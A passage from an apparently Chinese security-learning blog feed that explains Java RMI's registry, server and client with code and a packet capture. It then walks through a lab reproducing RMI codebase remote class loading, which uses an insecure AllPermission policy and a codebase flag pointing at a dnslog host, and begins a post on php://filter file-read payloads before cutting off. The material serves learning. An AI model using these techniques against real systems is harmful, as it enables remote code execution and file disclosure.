function_">hello</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> RemoteException;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">RemoteHelloWorld</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">IRemoteHelloWorld</span> &#123;<br>        <span class="hljs-keyword">protected</span> <span class="hljs-title function_">RemoteHelloWorld</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>            <span class="hljs-built_in">super</span>();<br>        &#125;<br><br>        <span class="hljs-keyword">public</span> String <span class="hljs-title function_">hello</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> RemoteException &#123;<br>            System.out.println(<span class="hljs-string">&quot;call from&quot;</span>);<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Hello World&quot;</span>;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">start</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">RemoteHelloWorld</span> <span class="hljs-variable">h</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RemoteHelloWorld</span>();<br>        LocateRegistry.createRegistry(<span class="hljs-number">1099</span>);<br>        Naming.rebind(<span class="hljs-string">&quot;rmi://127.0.0.1:1099/Hello&quot;</span>, h);<br>        <span class="hljs-comment">//rebind有两个参数</span><br>        <span class="hljs-comment">//name：表示要绑定的远程对象在RMI Registry中的名称，这是一个字符串类型的参数。</span><br><span class="hljs-comment">//obj：表示要绑定的远程对象，它必须实现java.rmi.Remote接口。</span><br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-keyword">new</span> <span class="hljs-title class_">RMIServer</span>().start();<br><br>    &#125;<br>&#125;<br><br><br></code></pre></td></tr></table></figure><p>客户端就简单多了，使⽤ Naming.lookup 在Registry中寻找到名字是Hello的对象，后⾯的使⽤就和在本地使⽤⼀样了</p><p><strong>RMIClient.java</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.net.MalformedURLException;<br><span class="hljs-keyword">import</span> java.rmi.Naming;<br><span class="hljs-keyword">import</span> java.rmi.NotBoundException;<br><span class="hljs-keyword">import</span> java.rmi.Remote;<br><span class="hljs-keyword">import</span> java.rmi.RemoteException;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">RMIClient</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> MalformedURLException, NotBoundException, RemoteException &#123;<br>        RMIServer.<span class="hljs-type">IRemoteHelloWorld</span> <span class="hljs-variable">Hello</span> <span class="hljs-operator">=</span> (RMIServer.IRemoteHelloWorld)Naming.lookup(<span class="hljs-string">&quot;rmi://192.168.1.115:1099/Hello&quot;</span>);<br>        <span class="hljs-comment">//这里强制转换的原因是Naming.lookup返回的是一个String对象，只有把他转换为IRemoteHelloWorld之后才可以调用我们的server中的方法</span><br>        <span class="hljs-type">String</span> <span class="hljs-variable">hello</span> <span class="hljs-operator">=</span> Hello.hello();<br>        System.out.println(hello);<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><blockquote><p>在 RMI 的远程调用中，客户端与服务器之间的通信是通过网络进行的。客户端在远程调用服务器上的对象时，实际上并不是直接调用服务器端的实现类（比如 <code>RemoteHelloWorld</code>），而是通过服务器端发布的远程接口来调用相应的方法。</p></blockquote><p>虽说执⾏远程⽅法的时候代码是在远程服务器上执⾏的，但实际上我们还是需要知道有哪些⽅法，这时候接⼝的重要性就体现了，这也是为什么我们前⾯要继承 Remote 并将我们需要调⽤的⽅法写在接⼝IRemoteHelloWorld ⾥，因为客户端也需要⽤到这个接⼝。</p><p>使用的具体流程是</p><p>先开启RMIServer，然后再开启客户端</p><p><img src="https://cdn.jsdelivr.net/gh/Decemberus/image/202303192107462.png" alt="image-20230225210904011"> </p><blockquote><p>关于这里Hello和hello的提示</p><p>在 <code>Naming.rebind(&quot;rmi://127.0.0.1:1099/Hello&quot;, h)</code> 中，”Hello” 是注册表中绑定到 <code>RemoteHelloWorld</code> 对象的名称。这个名称是区分大小写的，而不是与 <code>RemoteHelloWorld</code> 中的 <code>hello</code> 方法相关的名称。</p><p>当 RMI 服务器使用 <code>Naming.rebind()</code> 方法将 <code>RemoteHelloWorld</code> 实例绑定到名称为 “rmi:&#x2F;&#x2F;127.0.0.1:1099&#x2F;Hello” 的 RMI 注册表中时，客户端可以使用 “rmi:&#x2F;&#x2F;127.0.0.1:1099&#x2F;Hello” 名称来查找此 RMI 对象。这里的名称区分大小写，所以必须使用 “Hello” 而不是 “hello” 来查找该 RMI 对象。</p><p>绑定的是一个名称。和hello方法没有关系</p></blockquote><p>我们可以抓包看看RMI的通信过程。</p><p><img src="https://cdn.jsdelivr.net/gh/Decemberus/image/202303192107086.png" alt="img"> </p><p>这就是完整的通信过程，我们可以发现，整个过程进⾏了两次TCP握⼿，也就是我们实际建⽴了两次TCP连接。</p><p>第⼀次建⽴TCP连接是连接远端 192.168.1.115 的1099端⼝，这也是我们在代码⾥看到的端⼝，⼆者进⾏沟通后，我向远端发送了⼀个“Call”消息，远端回复了⼀个“ReturnData”消息，然后我新建了⼀个TCP连接，连到远端的53758端⼝。（应该来说每个人连到远端端口不一样）</p><p><img src="D:/mdimage/t016210c896f395c13f.png" alt="img"> </p><p>下面的新建的TCP连接的数据包</p><p><img src="https://cdn.jsdelivr.net/gh/Decemberus/image/202303192107511.png" alt="img"> </p><p>所以捋⼀捋这整个过程，⾸先客户端连接Registry，并在其中寻找Name是Hello的对象，这个对应数据流中的Call消息；然后Registry返回⼀个序列化的数据，这个就是找到的Name&#x3D;Hello的对象，这个对应数据流中的ReturnData消息；客户端反序列化该对象，发现该对象是⼀个远程对象，地址在192.168.1.115:53758 ，于是再与这个地址建⽴TCP连接；在这个新的连接中，才执⾏真正远程⽅法调⽤，也就是 hello() 。</p><p>我们借⽤下图来说明这些元素间的关系（来原p师傅）<img src="https://cdn.jsdelivr.net/gh/Decemberus/image/202303192107901.png" alt="img"></p><p>简单的说：RMI Registry就像⼀个⽹关，他⾃⼰是不会执⾏远程⽅法的，但RMI Server可以在上⾯注册⼀个Name到对象的绑定关系；RMI Client通过Name向RMI Registry查询，得到这个绑定关系，然后再连接RMI Server；最后，远程⽅法实际上在RMI Server上调⽤。</p><p>总结一下，一个RMI过程有以下三个参与者：</p><blockquote><p>RMI Registry</p><p>RMI Server</p><p>RMI Client</p></blockquote><p>但是为什么我给的示例代码只有两个部分呢？原因是，通常我们在新建一个RMI Registry的时候，都会直接绑定一个对象在上面，也就是说我们示例代码中的Server其实包含了Registry和Server两部分：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java">LocateRegistry.createRegistry(<span class="hljs-number">1099</span>);<br>Naming.bind(<span class="hljs-string">&quot;rmi://127.0.0.1:1099/Hello&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">RemoteHelloWorld</span>());<br></code></pre></td></tr></table></figure><p>第一行创建并运行RMI Registry，第二行将RemoteHelloWorld对象绑定到Hello这个名字上。</p><p>Naming.bind 的第一个参数是一个URL，形如： rmi:&#x2F;&#x2F;host:port&#x2F;name 。其中，host和port就是RMI Registry的地址和端口，name是远程对象的名字。</p><p>如果RMI Registry在本地运行，那么host和port是可以省略的，此时host默认是 localhost ，port默认是 1099 ：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">Naming.bind(<span class="hljs-string">&quot;Hello&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">RemoteHelloWorld</span>());<br></code></pre></td></tr></table></figure><p>以上就是RMI整个的原理与流程。接下来，我们很自然地想到，RMI会给我们带来哪些安全问题？</p><p>从两个方向思考一下这个问题：</p><ol><li><p>如果我们能访问RMI Registry服务，如何对其攻击？</p></li><li><p>如果我们控制了目标RMI客户端中 Naming.lookup 的第一个参数（也就是RMI Registry的地址），能不能进行攻击？</p></li></ol><h2 id="如何攻击RMI-Registry"><a href="#如何攻击RMI-Registry" class="headerlink" title="如何攻击RMI Registry"></a>如何攻击RMI Registry</h2><p>当我们可以访问目标RMI Registry的时候，会有哪些安全问题呢？</p><p>首先，RMI Registry是一个远程对象管理的地方，可以理解为一个远程对象的“后台”。我们可以尝试直接访问“后台”功能，比如修改远程服务器上Hello对应的对象：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">RemoteHelloWorld</span> <span class="hljs-variable">h</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RemoteHelloWorld</span>();<br>Naming.rebind(<span class="hljs-string">&quot;rmi://192.168.135.142:1099/Hello&quot;</span>, h);<br></code></pre></td></tr></table></figure><p>发生了这样的错误</p><img src="D:/mdimage/image-20221231104143549.png" alt="image-20221231104143549" style="zoom:150%;" /> <p>原来Java对远程访问RMI Registry做了限制，只有来源地址是localhost的时候，才能调用rebind、bind、unbind等方法。</p><p>不过list和lookup方法可以远程调用。</p><p>list方法可以列出目标上所有绑定的对象：</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs abnf">String[] s <span class="hljs-operator">=</span> Naming.list(<span class="hljs-string">&quot;rmi://192.168.135.142:1099&quot;</span>)<span class="hljs-comment">; </span><br></code></pre></td></tr></table></figure><p>lookup作用就是获得某个远程对象。</p><p>那么，只要目标服务器上存在一些危险方法，我们通过RMI就可以对其进行调用，之前曾经有一个工具</p><p><a href="https://github.com/NickstaDB/BaRMIe%EF%BC%8C%E5%85%B6%E4%B8%AD%E4%B8%80%E4%B8%AA%E5%8A%9F%E8%83%BD%E5%B0%B1%E6%98%AF%E8%BF%9B%E8%A1%8C%E5%8D%B1%E9%99%A9%E6%96%B9%E6%B3%95%E7%9A%84%E6%8E%A2%E6%B5%8B%E3%80%82">https://github.com/NickstaDB/BaRMIe，其中一个功能就是进行危险方法的探测。</a></p><p>但是显然，RMI的攻击面绝不仅仅是这样没营养。</p><h2 id="RMI利用codebase执行任意代码"><a href="#RMI利用codebase执行任意代码" class="headerlink" title="RMI利用codebase执行任意代码"></a>RMI利用codebase执行任意代码</h2><p>曾经有段时间，Java是可以运行在浏览器中的，对，就是Applet这个奇葩。在使用Applet的时候通常需要指定一个codebase属性，比如</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java">&lt;applet code=<span class="hljs-string">&quot;HelloWorld.class&quot;</span> codebase=<span class="hljs-string">&quot;Applets&quot;</span> width=<span class="hljs-string">&quot;800&quot;</span> height=<span class="hljs-string">&quot;600&quot;</span>&gt;<br>&lt;/applet&gt;<br></code></pre></td></tr></table></figure><p>codebase是一个地址，告诉Java虚拟机我们应该从哪个地方去搜索类，有点像我们日常用的CLASSPATH，但CLASSPATH是本地路径，而codebase通常是远程URL，比如http、ftp等。</p><p>如果我们指定 <code>codebase=http://example.com/</code> ，然后加载 org.vulhub.example.Example 类，则Java虚拟机会下载这个文件 <code>http://example.com/org/vulhub/example/Example.class</code> ，并作为Example类的字节码。</p><p>RMI的流程中，客户端和服务端之间传递的是一些序列化后的对象，这些对象在反序列化时，就会去寻找类。如果某一端反序列化时发现一个对象，那么就会去自己的CLASSPATH下寻找想对应的类；如果在本地没有找到这个类，就会去远程加载codebase中的类。</p><p>这个时候问题就来了，如果codebase被控制，我们不就可以加载恶意类了吗？</p><p>对，在RMI中，我们是可以将codebase随着序列化数据一起传输的，服务器在接收到这个数据后就会去CLASSPATH和指定的codebase寻找类，由于codebase被控制导致任意命令执行漏洞。</p><p>不过显然官方也注意到了这一个安全隐患，所以只有满足如下条件的RMI服务器才能被攻击：</p><ul><li>安装并配置了SecurityManager</li><li>Java版本低于7u21、6u45，或者设置了java.rmi.server.useCodebaseOnly&#x3D;false</li></ul><p>其中 java.rmi.server.useCodebaseOnly 是在Java 7u21、6u45的时候修改的一个默认设置：</p><blockquote><p><a href="https://docs.oracle.com/javase/7/docs/technotes/guides/rmi/enhancements-7.html">https://docs.oracle.com/javase/7/docs/technotes/guides/rmi/enhancements-7.html</a></p><p><a href="https://www.oracle.com/technetwork/java/javase/7u21-relnotes-1932873.html">https://www.oracle.com/technetwork/java/javase/7u21-relnotes-1932873.html</a></p></blockquote><p>官方将 java.rmi.server.useCodebaseOnly 的默认值由 false 改为了 true 。在java.rmi.server.useCodebaseOnly 配置为 true 的情况下，Java虚拟机将只信任预先配置好的codebase ，不再支持从RMI请求中获取</p><p>我们来编写一个简单的RMIServer用于复现这个漏洞。建立4个文件,记住一定要部署在服务器上</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs java"><br><span class="hljs-comment">//Calc</span><br><span class="hljs-keyword">package</span> codebase;<br><br><span class="hljs-keyword">import</span> java.rmi.RemoteException;<br><span class="hljs-keyword">import</span> java.rmi.server.UnicastRemoteObject;<br><span class="hljs-keyword">import</span> java.util.List;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Calc</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">UnicastRemoteObject</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">ICalc</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Calc</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> RemoteException &#123;<br><br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> Integer <span class="hljs-title function_">sum</span><span class="hljs-params">(List&lt;Integer&gt; params)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        Integer sum=<span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">for</span> (Integer param:params)&#123;<br>            sum +=param;<br>        &#125;<br>        <span class="hljs-keyword">return</span> sum;<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//ICalc</span><br><span class="hljs-keyword">package</span> codebase;<br><br><span class="hljs-keyword">import</span> java.rmi.Remote;<br><span class="hljs-keyword">import</span> java.util.List;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">ICalc</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Remote</span> &#123;<br>    <span class="hljs-keyword">public</span> Integer <span class="hljs-title function_">sum</span><span class="hljs-params">(List&lt;Integer&gt; params)</span> <span class="hljs-keyword">throws</span> Exception;<br>&#125;<br><br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//RemoteRMIServer</span><br><span class="hljs-keyword">package</span> codebase;<br><br><span class="hljs-keyword">import</span> java.rmi.Naming;<br><span class="hljs-keyword">import</span> java.rmi.registry.LocateRegistry;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">RemoteRMIServer</span> &#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">start</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-keyword">if</span>(System.getSecurityManager()==<span class="hljs-literal">null</span>)&#123;<br>            System.out.println(<span class="hljs-string">&quot;start Security&quot;</span>);<br>            System.setSecurityManager(<span class="hljs-keyword">new</span> <span class="hljs-title class_">SecurityManager</span>());<br><br>        &#125;<br>        <span class="hljs-type">Calc</span> <span class="hljs-variable">a</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Calc</span>();<br>        LocateRegistry.createRegistry(<span class="hljs-number">1099</span>);<br>        Naming.rebind(<span class="hljs-string">&quot;refobj&quot;</span>,a);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-keyword">new</span> <span class="hljs-title class_">RemoteRMIServer</span>().start();<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">//client.<span class="hljs-keyword">policy</span><br><span class="hljs-keyword">grant</span> &#123;<br>permission java.<span class="hljs-keyword">security</span>.AllPermission;<br>&#125;;<br></code></pre></td></tr></table></figure><p>这个如果在本机部署的话会出现很多错误，所以只能部署在服务器上</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">javac</span> <span class="hljs-regexp">*.java</span><br></code></pre></td></tr></table></figure><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gradle"><span class="hljs-regexp">/usr/</span>lib<span class="hljs-regexp">/jvm/</span>java-<span class="hljs-number">11</span>-openjdk-<span class="hljs-number">11.0</span>.<span class="hljs-number">18.0</span>.<span class="hljs-number">10</span>-<span class="hljs-number">1</span>.el7_9.x86_64<span class="hljs-regexp">/bin/</span>java -Djava.rmi.server.hostname=<span class="hljs-number">110.42</span>.<span class="hljs-number">158.239</span> -Djava.rmi.server.useCodebaseOnly=<span class="hljs-keyword">false</span> -Djava.security.policy=client.policy RemoteRMIServer<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/Decemberus/image/202303192107109.png" alt="image-20230226104201093"> </p><p>成功</p><p>接下来我们需要在本机上创建一个Client</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> codebase;<br><br><span class="hljs-keyword">import</span> java.io.Serializable;<br><span class="hljs-keyword">import</span> java.rmi.Naming;<br><span class="hljs-keyword">import</span> java.rmi.Remote;<br><span class="hljs-keyword">import</span> java.util.ArrayList;<br><span class="hljs-keyword">import</span> java.util.List;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">RMIClient</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Serializable</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Payload</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">ArrayList</span>&lt;Integer&gt;&#123;&#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">lookup</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        ICalc r= (ICalc)Naming.lookup(<span class="hljs-string">&quot;rmi://110.42.158.239/refObj&quot;</span>);<br>        List&lt;Integer&gt; li=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Payload</span>();<br>        li.add(<span class="hljs-number">3</span>);<br>        li.add(<span class="hljs-number">4</span>);<br>        System.out.println(r.sum(li));<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-keyword">new</span> <span class="hljs-title class_">RMIClient</span>().lookup();<br>    &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/Decemberus/image/202303192108062.png" alt="image-20230226110152067"> </p><p>添加程序参数</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">-Djava<span class="hljs-selector-class">.rmi</span><span class="hljs-selector-class">.server</span>.useCodebaseOnly=false -Djava<span class="hljs-selector-class">.rmi</span><span class="hljs-selector-class">.server</span>.codebase=hz0vdn<span class="hljs-selector-class">.dnslog</span>.cn<br></code></pre></td></tr></table></figure><p>运行以后出现这个错误</p><p><img src="https://cdn.jsdelivr.net/gh/Decemberus/image/202303192108592.png" alt="image-20230226110122197"> </p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>PHP协议及死亡绕过</title>
    <link href="/Decemberus.github-io/2022/03/15/php%E5%8D%8F%E8%AE%AE%E7%9A%84%E5%A6%99%E7%94%A8/"/>
    <url>/Decemberus.github-io/2022/03/15/php%E5%8D%8F%E8%AE%AE%E7%9A%84%E5%A6%99%E7%94%A8/</url>
    
    <content type="html"><![CDATA[<h1 id="php-x2F-x2F-filter过滤器学习及其死亡绕过"><a href="#php-x2F-x2F-filter过滤器学习及其死亡绕过" class="headerlink" title="php:&#x2F;&#x2F;filter过滤器学习及其死亡绕过"></a>php:&#x2F;&#x2F;filter过滤器学习及其死亡绕过</h1><h2 id="php-x2F-x2F-filter"><a href="#php-x2F-x2F-filter" class="headerlink" title="php:&#x2F;&#x2F;filter"></a>php:&#x2F;&#x2F;filter</h2><h3 id="简单介绍"><a href="#简单介绍" class="headerlink" title="简单介绍"></a>简单介绍</h3><p><code>php://filter</code> 是一种元封装器，设计用于数据流打开时的筛选过滤应用。这对于一体式（all-in-one）的文件函数非常有用，类似 <code>readfile()</code>、 <code>file()</code> 和 <code>file_get_contents()</code>，在数据流内容读取之前没有机会应用其他过滤器。 <code>php://filter</code> 目标使用以下的参数作为它路径的一部分。复合过滤链能够在一个路径上指定。详细使用这些参数可以参考具体范例。</p><h3 id="参数"><a href="#参数" class="headerlink" title="参数"></a>参数</h3><table><thead><tr><th align="left">名称</th><th align="left">描述</th></tr></thead><tbody><tr><td align="left"><code>resource=&lt;要过滤的数据流&gt;</code></td><td align="left">这个参数是必须的。它指定了你要筛选过滤的数据流。</td></tr><tr><td align="left"><code>read=&lt;读链的筛选列表&gt;</code></td><td align="left">该参数可选。可以设定一个或多个过滤器名称，以管道符（&#96;</td></tr><tr><td align="left"><code>write=&lt;写链的筛选列表&gt;</code></td><td align="left">该参数可选。可以设定一个或多个过滤器名称，以管道符（&#96;</td></tr><tr><td align="left"><code>&lt;；两个链的筛选列表&gt;</code></td><td align="left">任何没有以 <code>read=</code> 或 <code>write=</code> 作前缀 的筛选器列表会视情况应用于读或写链。</td></tr></tbody></table><h2 id="两个函数的介绍"><a href="#两个函数的介绍" class="headerlink" title="两个函数的介绍"></a>两个函数的介绍</h2><h3 id="file-get-contents"><a href="#file-get-contents" class="headerlink" title="file_get_contents"></a>file_get_contents</h3><p>将整个文件读入一个字符串</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">file_get_contents</span>(<br>    <span class="hljs-keyword">string</span> <span class="hljs-variable">$filename</span>,<br>    <span class="hljs-keyword">bool</span> <span class="hljs-variable">$use_include_path</span> = <span class="hljs-literal">false</span>,<br>    ?resource <span class="hljs-variable">$context</span> = <span class="hljs-literal">null</span>,<br>    <span class="hljs-keyword">int</span> <span class="hljs-variable">$offset</span> = <span class="hljs-number">0</span>,<br>    ?<span class="hljs-keyword">int</span> <span class="hljs-variable">$length</span> = <span class="hljs-literal">null</span><br>): <span class="hljs-keyword">string</span>|<span class="hljs-literal">false</span><br></code></pre></td></tr></table></figure><p><img src="D:/mdimage/image-20221017181747756.png" alt="image-20221017181747756"> </p><p>示例1</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php">获取并输出网站首页 HTML 源码<br><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$homepage</span> = <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">&#x27;http://www.example.com/&#x27;</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$homepage</span>;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><h3 id="file-put-contents"><a href="#file-put-contents" class="headerlink" title="file_put_contents"></a>file_put_contents</h3><p>将数据写入文件</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">file_put_contents</span>(<br>    <span class="hljs-keyword">string</span> <span class="hljs-variable">$filename</span>,<br>    <span class="hljs-keyword">mixed</span> <span class="hljs-variable">$data</span>,<br>    <span class="hljs-keyword">int</span> <span class="hljs-variable">$flags</span> = <span class="hljs-number">0</span>,<br>    ?resource <span class="hljs-variable">$context</span> = <span class="hljs-literal">null</span><br>): <span class="hljs-keyword">int</span>|<span class="hljs-literal">false</span><br></code></pre></td></tr></table></figure><p><img src="D:/mdimage/image-20221017182407459.png" alt="image-20221017182407459"> </p><h2 id="读写文件"><a href="#读写文件" class="headerlink" title="读写文件"></a>读写文件</h2><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-comment"># 明文读取</span><br>index.php?file1=php:<span class="hljs-regexp">//</span>filter/resource=file.txt<br><br><span class="hljs-comment"># 编码读取</span><br>index.php?file1=php:<span class="hljs-regexp">//</span>filter<span class="hljs-regexp">/read=convert.base64-encode/</span>resource=file.txt<br></code></pre></td></tr></table></figure><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-comment"># 明文读取</span><br>index.php?file1=php:<span class="hljs-regexp">//</span>filter/resource=file.txt<br><br><span class="hljs-comment"># 编码读取</span><br>index.php?file1=php:<span class="hljs-regexp">//</span>filter<span class="hljs-regexp">/read=convert.base64-encode/</span>resource=file.txt<br></code></pre></td></tr></table></figure><h2 id="过滤器和他的朋友们"><a href="#过滤器和他的朋友们" class="headerlink" title="过滤器和他的朋友们"></a>过滤器和他的朋友们</h2><p><a href="https://www.php.net/manual/zh/filters.php">PHP: 可用过滤器列表 - Manual</a></p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span 